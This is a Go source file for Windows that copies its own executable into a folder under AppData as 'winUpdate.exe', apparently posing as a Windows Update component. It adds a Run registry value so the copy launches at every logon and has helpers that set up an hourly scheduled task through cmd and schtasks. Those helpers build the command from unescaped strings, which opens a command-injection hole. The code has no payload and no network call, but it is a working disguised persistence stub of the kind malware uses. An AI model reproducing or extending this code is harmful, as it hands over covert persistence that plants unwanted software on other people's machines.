package main

import (
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	//"log"
	//"time"
	//"syscall"
	//"unsafe"
	//"encoding/binary"
	//"unicode/utf16"
	//"unicode/utf8"
	"golang.org/x/sys/windows/registry"
)

var (
	programName        string = "winUpdate"
	copyProgramDir     string = os.Getenv("APPDATA") + `\WindowsUpdate`
	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
	sourceExecFilePath string = os.Args[0]
)

func main() {
	var err error

	err = os.MkdirAll(copyProgramDir, 0777)
	fmt.Println(err)

	err = RegisterAutoRun()
	fmt.Println(err)

	err = CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
	fmt.Println(err)
}

func CmdExec(cmd string) ([]byte, error) {
	return exec.Command("cmd", "/C", cmd).Output()
}

func GetRegistryKey(typeReg registry.Key, regPath string) (key registry.Key, err error) {
	currentKey, err := registry.OpenKey(typeReg, regPath, registry.ALL_ACCESS)
	return currentKey, err
}

func IsValueSetRegistryKey(typeReg registry.Key, regPath, nameValue string) error {
	currentKey, err := GetRegistryKey(typeReg, regPath)
	if err != nil {
		return err
	}
	defer currentKey.Close()

	_, _, err = currentKey.GetStringValue(nameValue)
	return err
}

func WriteRegistryKey(typeReg registry.Key, regPath, nameProgram, pathToExecFile string) error {
	updateKey, err := GetRegistryKey(typeReg, regPath)
	if err != nil {
		return err
	}
	defer updateKey.Close()
	return updateKey.SetStringValue(nameProgram, pathToExecFile)
}

func DeleteRegistryKey(typeReg registry.Key, regPath, nameProgram string) error {
	deleteKey, err := GetRegistryKey(typeReg, regPath)
	if err != nil {
		return err
	}
	defer deleteKey.Close()
	return deleteKey.DeleteValue(nameProgram)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName, copyExecFilePath)
	return err
}

func IsRegisterAutoRun() error {
	err := IsValueSetRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
	return err
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
}

func RegisterSchedule(nameTask string, pathToFile string) ([]byte, error) {
	return CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
}

func IsRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /query /tn " + nameTask + "\"")
}

func UnRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /delete /f /tn " + nameTask)
}

func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return errors.New("Bad copy file")
	}
	return nil
}
